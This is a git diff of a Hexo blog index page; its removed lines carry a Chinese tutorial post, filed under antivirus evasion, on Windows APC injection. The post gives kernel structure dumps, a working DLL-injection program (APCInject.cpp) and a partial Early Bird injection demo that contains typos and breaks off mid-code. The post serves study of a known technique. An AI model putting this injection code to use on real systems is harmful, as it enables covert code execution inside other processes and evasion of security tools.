@@ -1,338 +1,329 @@
 <!DOCTYPE html>
-<html>
+<html lang=en>
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/page/3/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Hexo</title>
+    <!-- styles -->
+    
 <link rel="stylesheet" href="/css/style.css">
 
-  
+    <!-- rss -->
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
+    
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
+    
+    <div class="content index width mx-auto px2 my4">
+        
+          <header id="header">
+  <a href="/">
+  
+    
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+    
+  
+    <div id="title">
+      <h1>Hexo</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fa fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/posts/">Writing</a></li>
+       
+        <li><a target="_blank" rel="noopener" href="http://github.com/sergodeeva">Projects</a></li>
       
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
+    </ul>
   </div>
 </header>
 
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-免杀/APC注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/APC%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time class="dt-published" datetime="2024-10-08T03:50:54.549Z" itemprop="datePublished">2024-10-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="APC-注入"><a href="#APC-注入" class="headerlink" title="APC 注入"></a>APC 注入</h1><p>异步过程调用（APC, Asynchronous Procedure Call）是一种在Windows操作系统中使用的机制，允许在一个线程中调用另一个线程的函数，而不会阻塞调用线程。这种机制常用于需要在后台执行任务的情况，比如处理I&#x2F;O操作或定时处理等</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数</p>
-<p>APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC。这两种APC的区别除了是否出3环之外还有</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当用户模式 APC 排队时，它排队的线程不会被定向到调用 APC 函数，除非它处于可警告状态。线</span><br><span class="line">程在调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx、</span><br><span class="line">WaitForMultipleObjectsEx或WaitForSingleObjectEx函数时进入可警告状态。如果在 APC 排队之</span><br><span class="line">前等待满足，则线程不再处于可警告等待状态，因此不会执行 APC 函数。但是，APC 仍在排队，</span><br><span class="line">因此当线程调用另一个可警告的等待函数时，APC 函数将被执行</span><br></pre></td></tr></table></figure>
-
-<p>如果我们不想用这些函数来触发APC，那么就应该在一开始创建进程的时候就挂起</p>
-<p>在 Windows系统中,每个线程都会维护一个线程 APC队列，通过 QueueUserAPC 把一个APC 函数添加到 指定线程的APC队列中。每个线程都有自己的APC队列，这个 APC队列记录了要求线程执行的一些APC 函数。Windows系统会发出一个软中断去执行这些APC 函数，<strong>对于用户模式下的APC 队列</strong>，<strong>当线程处在 可警告状态时才会执行这些APC 函数</strong>。一个线程在内部使用 SignalObjectAndWait 、 SleepEx 、 WaitForSingleObjectEx 、 WaitForMultipleObjectsEx 等函数把自己挂起时就是进入可警告状态， 此时便会执行APC队列函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断</span><br><span class="line">（或者是Messagebox弹窗的时候不点OK的时候也能注入）</span><br><span class="line">2.当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数</span><br><span class="line">3.利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插</span><br><span class="line">入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的</span><br></pre></td></tr></table></figure>
-
-<p><strong>简单来说，我的理解，往apc里面插函数，通过某种办法产生软中断使其执行APC队列里面的函数，达到抢夺APC队列的目的</strong>h</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. OpenProcess 打开进程</span><br><span class="line">2. VirtualAlloc 申请空间</span><br><span class="line">3. WriteProcessMemory 写入dll信息</span><br><span class="line">4.根据进程对应的线程id打开线程</span><br><span class="line">5.使用 QueueUserApc 插入执行</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><h3 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">QueueUserAPC</span><span class="params">(</span></span><br><span class="line"><span class="params">PAPCFUNCpfnAPC, <span class="comment">// APC function</span></span></span><br><span class="line"><span class="params">HANDLEhThread, <span class="comment">// handle to thread</span></span></span><br><span class="line"><span class="params">ULONG_PTRdwData <span class="comment">// APC function parameter</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>QueueUserAPC 函数的第一个参数表示执行函数的地址，当开始执行该APC的时候，程序会跳转到该函 数地址处来执行。</p>
-<p>第二个参数表示插入APC的线程句柄，要求线程句柄必须包含 THREAD_SET_CONTEXT 访问权限。</p>
-<p>第三个参数表示传递给执行函数的参数，与远线程注入类似，如果 QueueUserAPC 的第一个参数为LoadLibraryA，第三个参数设置的是dll路径即可完成dll注入</p>
-<h2 id="跟进（64位）"><a href="#跟进（64位）" class="headerlink" title="跟进（64位）"></a>跟进（64位）</h2><p>_KAPC_STATE这个结构在偏移0x98处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dt _KTHREAD</span><br><span class="line">nt!_KTHREAD</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x018 SListFaultAddress : Ptr64 Void</span><br><span class="line">   +0x020 QuantumTarget    : Uint8B</span><br><span class="line">   +0x028 InitialStack     : Ptr64 Void</span><br><span class="line">   +0x030 StackLimit       : Ptr64 Void</span><br><span class="line">   +0x038 StackBase        : Ptr64 Void</span><br><span class="line">   +0x040 ThreadLock       : Uint8B</span><br><span class="line">   +0x048 CycleTime        : Uint8B</span><br><span class="line">......................</span><br><span class="line">   +0x07e ExplicitSystemHeteroCpuPolicy : Pos 7, 1 Bit</span><br><span class="line">   +0x07f RunningNonRetpolineCode : Pos 0, 1 Bit</span><br><span class="line">   +0x07f SpecCtrlSpare    : Pos 1, 7 Bits</span><br><span class="line">   +0x07f SpecCtrl         : UChar</span><br><span class="line">   +0x080 SystemCallNumber : Uint4B</span><br><span class="line">   +0x084 ReadyTime        : Uint4B</span><br><span class="line">   +0x088 FirstArgument    : Ptr64 Void</span><br><span class="line">   +0x090 TrapFrame        : Ptr64 _KTRAP_FRAME</span><br><span class="line">   +0x098 ApcState         : _KAPC_STATE//</span><br><span class="line">   +0x098 ApcStateFill     : [43] UChar</span><br><span class="line">   +0x0c3 Priority         : Char</span><br><span class="line">  .......................................</span><br></pre></td></tr></table></figure>
-
-<p>而里面存储着我们需要的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dt _KAPC_STATE</span><br><span class="line">nt!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY //2个APC队列 用户APC和内核APC</span><br><span class="line">   +0x020 Process          : Ptr64 _KPROCESS//线程所属或者所挂靠的进程</span><br><span class="line">   +0x028 InProgressFlags  : UChar</span><br><span class="line">   +0x028 KernelApcInProgress : Pos 0, 1 Bit//内核APC是否正在执行</span><br><span class="line">   +0x028 SpecialApcInProgress : Pos 1, 1 Bit</span><br><span class="line">   +0x029 KernelApcPending : UChar//是否有正在等待执行的内核APC</span><br><span class="line">   +0x02a UserApcPendingAll : UChar</span><br><span class="line">   +0x02a SpecialUserApcPending : Pos 0, 1 Bit</span><br><span class="line">   +0x02a UserApcPending   : Pos 1, 1 Bit</span><br></pre></td></tr></table></figure>
-
-
-
-<p>另一个结构_KAPC</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.......<span class="comment">//在 _KTHREAD中</span></span><br><span class="line">+<span class="number">0x258</span> SavedApcStateFill : [<span class="number">43</span>] UChar</span><br><span class="line">   +<span class="number">0x283</span> WaitReason       : UChar</span><br><span class="line">   +<span class="number">0x284</span> SuspendCount     : Char</span><br><span class="line">   +<span class="number">0x285</span> Saturation       : Char</span><br><span class="line">   +<span class="number">0x286</span> SListFaultCount  : Uint2B</span><br><span class="line">   +<span class="number">0x288</span> SchedulerApc     : _KAPC <span class="comment">//</span></span><br><span class="line">   +<span class="number">0x288</span> SchedulerApcFill1 : [<span class="number">3</span>] UChar</span><br><span class="line">   +<span class="number">0x28b</span> QuantumReset     : UChar</span><br><span class="line">   +<span class="number">0x288</span> SchedulerApcFill2 : [<span class="number">4</span>] UChar</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dt _KAPC</span><br><span class="line">nt!_KAPC</span><br><span class="line">   +0x000 Type             : UChar</span><br><span class="line">   +0x001 AllFlags         : UChar</span><br><span class="line">   +0x001 CallbackDataContext : Pos 0, 1 Bit</span><br><span class="line">   +0x001 Unused           : Pos 1, 7 Bits</span><br><span class="line">   +0x002 Size             : UChar</span><br><span class="line">   +0x003 SpareByte1       : UChar</span><br><span class="line">   +0x004 SpareLong0       : Uint4B</span><br><span class="line">   +0x008 Thread           : Ptr64 _KTHREAD</span><br><span class="line">   +0x010 ApcListEntry     : _LIST_ENTRY</span><br><span class="line">   +0x020 KernelRoutine    : Ptr64     void </span><br><span class="line">   +0x028 RundownRoutine   : Ptr64     void </span><br><span class="line">   +0x030 NormalRoutine    : Ptr64     void //通过这里找到APC函数的地址</span><br><span class="line">   +0x020 Reserved         : [3] Ptr64 Void</span><br><span class="line">   +0x038 NormalContext    : Ptr64 Void</span><br><span class="line">   +0x040 SystemArgument1  : Ptr64 Void</span><br><span class="line">   +0x048 SystemArgument2  : Ptr64 Void</span><br><span class="line">   +0x050 ApcStateIndex    : Char</span><br><span class="line">   +0x051 ApcMode          : Char</span><br><span class="line">   +0x052 Inserted         : UChar</span><br></pre></td></tr></table></figure>
-
-<h2 id="APC队列插入"><a href="#APC队列插入" class="headerlink" title="APC队列插入"></a>APC队列插入</h2><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>自己实现APC队列的插入，在三环调用QueueUserAPC</p>
-<p>尝试代码示例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// APC1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="line">//</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">DWORD WINAPI MyThread(LPVOID)</span><br><span class="line">&#123;</span><br><span class="line">int i = 0;</span><br><span class="line">while (true)</span><br><span class="line">&#123;</span><br><span class="line">SleepEx(300, TRUE);</span><br><span class="line">printf(&quot;%d\n&quot;, i++);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">void __stdcall MyApcFunction(LPVOID)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Run APCFuntion\n&quot;);</span><br><span class="line">	printf(&quot;APCFunction done\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HANDLE hThread = CreateThread(0, 0, MyThread, 0, 0, 0);</span><br><span class="line">Sleep(1000);</span><br><span class="line">if (!QueueUserAPC((PAPCFUNC)MyApcFunction, hThread, NULL))</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;QueueUserAPC error : %d\n&quot;, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">//上面的代码如果成功，那么会在print的数字中间插入Run APCFuntion和APCFunction done</span><br></pre></td></tr></table></figure>
-
-<p>回去看下具体的函数结构</p>
-<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925172913792.png" alt="image-20240925172913792"></p>
-<p>可以看见，我们调用的api还是从kernel32里面出来的</p>
-<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925173026800.png" alt="image-20240925173026800"></p>
-<p>同理，继续去kernel32里面找，在kernelbase里面的QueueUserAPC函数里面找到了__imp_NtQueueApcThreadEx2</p>
-<p><img src="C:\Users\su\Downloads\image.png" alt="image"></p>
-<p>进入导入表中查看，果然是在ntdll里面</p>
-<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925173153021.png" alt="image-20240925173153021"></p>
-<p>在ntdll里面找到具体的syscall</p>
-<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925173231120.png" alt="image-20240925173231120"></p>
-<p>由于内核中的实现一般在ntoskrnl.exe中，所以可以直接在这个exe中找</p>
-<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925173329528.png" alt="image-20240925173329528"></p>
-<p>可以看见最后是调用 KeInitializeApc 和 KeInsertQueueApc 这两个函数来实现APC的效果</p>
-<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925173406735.png" alt="image-20240925173406735"></p>
-<p>这里我们需要提到内核APC和用户APC的区别，用户APC需要从三环返回零环来进行执行</p>
-<h2 id="Inject-demo"><a href="#Inject-demo" class="headerlink" title="Inject demo"></a>Inject demo</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="comment">// 提权函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hToken;</span><br><span class="line">BOOL fOk = FALSE;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">&#123;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">fOk = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fOk;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">APCInjectDLL</span><span class="params">(DWORD dwPid, <span class="type">char</span>* pszDllName)</span> </span>&#123;</span><br><span class="line"><span class="built_in">EnableDebugPrivilege</span>();</span><br><span class="line"><span class="comment">//打开进程,获取进程句柄</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向目标进程申请空间写入dll全路径</span></span><br><span class="line"><span class="type">int</span> nSize = <span class="built_in">strlen</span>(pszDllName);</span><br><span class="line">LPVOID pDllAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, nSize, MEM_COMMIT,</span><br><span class="line">PAGE_READWRITE);</span><br><span class="line">SIZE_T dwWrittenSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pDllAddr, pszDllName, nSize, &amp;dwWrittenSize);</span><br><span class="line"><span class="comment">//获取LoadLibraryA的地址</span></span><br><span class="line">HMODULE hMod = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">FARPROC pFuncAddr = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="comment">//创建线程快照</span></span><br><span class="line">THREADENTRY32 te = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">te.dwSize = <span class="built_in">sizeof</span>(te);</span><br><span class="line">HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hSnap, &amp;te)) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">dwRet = <span class="built_in">QueueUserAPC</span>((PAPCFUNC)pFuncAddr, hThread,</span><br><span class="line">(ULONG_PTR)pDllAddr);</span><br><span class="line">hThread = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hSnap, &amp;te));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnap);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">APCInjectDLL</span>((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;APCInject failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;APCInject successfully\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nUsage: %s &lt;PID&gt; &lt;Dllpath&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Example: %s 520 C:\\test.dll\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-
-<p>这里就有一个问题，如果在一开始就让进程按照挂起的方式来进行创建，那么是不是就可以在APC队列插入的时候直接触发，这就是Early Bird注入</p>
-<h2 id="Early-Bird-demo"><a href="#Early-Bird-demo" class="headerlink" title="Early Bird demo"></a>Early Bird demo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    unsigned char DllPath[] = &quot;C:\\User\\Excel\\Desktop\\Dll2.dll&quot;;</span><br><span class="line">SIZE_T DllPathSize = sizeof(Dllpath);</span><br><span class="line">STARTUPINFOA si =&#123;0&#125;;</span><br><span class="line">PROCESS_INFOMATION pi = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">//创建目标进程</span><br><span class="line">if(!CreateProcessA(&quot;C:\\Windows\\System32\\notepad.exe&quot;,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&amp;si,&amp;pi))&#123;</span><br><span class="line">    printf(&quot;CreateProcessAError:%d&quot;,GetLastError());</span><br><span class="line">return 1；</span><br><span class="line">&#125;</span><br><span class="line">HANDLE victimProcess = pi.hProcess;</span><br><span class="line">HANDLE threadHandle = pi.hThread;</span><br><span class="line"></span><br><span 